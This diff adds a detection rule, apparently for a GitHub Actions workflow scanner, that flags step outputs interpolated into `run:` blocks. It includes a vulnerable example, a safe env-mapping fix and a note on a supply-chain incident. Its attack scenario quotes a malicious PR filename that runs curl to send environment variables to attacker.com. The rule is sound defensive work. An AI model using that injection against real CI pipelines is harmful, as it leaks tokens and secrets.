@@ -1,0 +1,82 @@
+id: RGS-019
+group: injection
+name: "Step Output Interpolated in run Block"
+severity: medium
+description: >
+  A `run:` block directly interpolates a `${{ steps.<id>.outputs.<name> }}` expression.
+  Step outputs may contain attacker-controlled data depending on what the producing step
+  does. Common dangerous patterns include steps that process PR filenames (via `git diff
+  --name-only`), PR metadata, issue content, or any external input that flows through
+  `$GITHUB_OUTPUT`. When interpolated directly into a `run:` block, the value is pasted
+  into the shell script before execution, enabling command injection if the value contains
+  shell metacharacters. Unlike Tier-1 sources (e.g., `github.event.pull_request.title`)
+  which are always attacker-controlled, step outputs require manual review to determine
+  whether the producing step handles untrusted data. This rule flags all such cases for
+  review.
+
+tags:
+  - injection
+  - step-output
+  - advisory
+
+attack_scenario: >
+  A workflow has two steps: Step 1 runs `git diff --name-only` on a pull request and
+  writes the changed filenames to `$GITHUB_OUTPUT`. Step 2 interpolates that output
+  directly in a `run:` block: `npm run lint -- ${{ steps.files.outputs.all_changed_files }}`.
+  An attacker opens a PR that adds a file named `streams/$(curl attacker.com/exfil?t=$(env)).m3u`.
+  The malicious filename flows from `git diff` output through `$GITHUB_OUTPUT` into the
+  step output, then gets interpolated directly into the shell script. The shell executes
+  the embedded command substitution, exfiltrating environment variables (including
+  GITHUB_TOKEN and any secrets passed via env) to the attacker's server. Because the
+  injection happens through an intermediate step output rather than a direct Tier-1
+  source, automated detection requires manual review of the data flow.
+
+real_world_incident: >
+  The tj-actions/changed-files supply chain attack in March 2025 exploited exactly this
+  pattern. The action produced step outputs containing filenames from pull requests, and
+  thousands of downstream workflows interpolated those outputs directly in `run:` blocks.
+  When the action was compromised, the attacker was able to inject arbitrary content into
+  step outputs, which was then executed as shell commands in every workflow that used the
+  action's outputs in `run:` blocks without the env mapping pattern.
+
+fix: |
+  **Pass step outputs through the `env:` mapping instead of interpolating directly in `run:` blocks.**
+
+  **Vulnerable pattern:**
+
+  ```yaml
+  # DANGEROUS: Step output interpolated directly into shell script
+  - name: Get changed files
+    id: files
+    run: |
+      echo "all_changed_files=$(git diff --name-only HEAD~1)" >> "$GITHUB_OUTPUT"
+
+  - name: Lint changed files
+    run: |
+      npm run lint -- ${{ steps.files.outputs.all_changed_files }}
+  ```
+
+  **Safe pattern using env mapping:**
+
+  ```yaml
+  # SAFE: Step output passed through environment variable
+  - name: Lint changed files
+    run: |
+      npm run lint -- ${ALL_CHANGED_FILES}
+    env:
+      ALL_CHANGED_FILES: ${{ steps.files.outputs.all_changed_files }}
+  ```
+
+  **Why this works:** When you use `${{ }}` in the `env:` mapping, the value is
+  assigned to an environment variable by the runner. The shell treats `${ALL_CHANGED_FILES}`
+  as a data value, not as executable code. Shell metacharacters in the value are not
+  interpreted as shell syntax.
+
+  **Note:** Not all step outputs are dangerous. Outputs that contain only controlled
+  values (booleans, hashes, timestamps) are generally safe. This rule flags all cases
+  for manual review. Focus on step outputs that may contain:
+  - Filenames from PRs or branches
+  - User-provided text (PR titles, issue bodies, comments)
+  - Data from external sources (API responses, file contents)
+
+references: []
